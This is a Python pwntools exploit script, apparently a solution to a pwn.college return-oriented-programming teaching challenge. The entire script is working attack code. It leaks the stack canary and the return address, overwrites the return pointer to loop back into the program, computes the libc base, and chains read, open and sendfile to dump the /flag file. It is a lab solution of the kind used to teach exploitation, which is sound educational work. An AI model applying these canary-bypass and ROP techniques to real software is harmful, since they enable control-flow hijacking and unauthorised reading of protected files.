#!/usr/bin/env python3

from pwn import *

FILENAME='/babyrop_level13_teaching1'

# Create a process
p = process(FILENAME)
#p = process(["strace", "-o", "trace.out", FILENAME])

for i in range(2):
    # Create an ELF and a ROP object
    context.binary = elf = ELF(FILENAME)
    rop = ROP(elf)

    # Read the address of input buffer
    p.recvuntil(b'[LEAK] Your input buffer is located at: 0x')
    input_buffer_address = int(p.recv(12), 16)
    log.info('Address of input buffer: ' + hex(input_buffer_address))

    # Send the address to read
    if i == 0:
        # Address for stack canary
        p.sendline(bytes(hex(input_buffer_address + 0x68), 'utf-8'))
    else:
        # Address for return address
        p.sendline(bytes(hex(input_buffer_address + 0x78), 'utf-8'))
    
    # Read the stack canary
    p.recvuntil(b'[LEAK] *0x')
    p.recv(17)
    if i == 0:
        stack_canary = int(p.recv(16), 16)
        log.info('Stack canary: ' + hex(stack_canary))
    else:
        return_address = int(p.recv(16), 16)
        log.info('Return address: ' + hex(return_address))

    # Padding
    rop.raw(b'\x00' * 104)

    # Stack canary
    rop.raw(p64(stack_canary))

    # RBP
    rop.raw(b'a' * 8)

    if i == 0:
        # Return to __libc_start_main function
        rop.raw(p8(0x99))
    else:
        # ROP Gadgets with libc library
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        libc.address = return_address - (libc.symbols['__libc_start_main'] + 0xf3)
        log.info("libc address: " + hex(libc.address))

        rop_libc = ROP(libc)
        rop_libc.read(0, input_buffer_address, 5)
        rop_libc.open(input_buffer_address, 0)
        rop_libc.sendfile(1, 3, 0, 400)

        # Debugging
        #print(rop_libc.dump())
        #print(hexdump(bytes(rop_libc)))

    # Debugging
    #print(rop.dump())
    #print(hexdump(bytes(rop)))

    # Send input
    if i == 0:
        p.send(rop.chain())
    else:
        p.send(rop.chain() + rop_libc.chain())
        p.sendline(b"/flag")
        print(p.recvline_startswith(b'pwn_college'))
